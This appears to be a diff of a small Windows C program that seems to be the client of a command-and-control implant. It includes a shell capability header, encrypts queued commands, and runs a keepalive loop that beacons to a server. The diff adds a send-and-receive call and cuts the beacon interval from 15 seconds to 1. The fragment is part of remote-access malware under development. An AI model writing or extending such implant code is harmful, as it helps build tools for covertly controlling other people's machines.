@@ -1,10 +1,9 @@
 #include "crypt.h"
 #include "comm.h"
 #include "capabilities/shell.h"
-#include "parser.h"
 #include "protocol.h"
 #include <windows.h>
-
+#include <stdio.h>
 
 /**
  * This function will run the keepalive loop that looks for new commands and notifies the server that the client is alive.
@@ -15,9 +14,16 @@ int main(){
         char* command = commands[keepalive];
         char* encrypted_command = encrypt(command);
         
+        char buffer[512];
+        int failure = send_and_receive(encrypted_command, buffer, 512);
+
+        if (!failure){
+            printf("SUCCESS!");
+        }
+        
 
 
-        Sleep(15000);
+        Sleep(1000);
     }
 
 
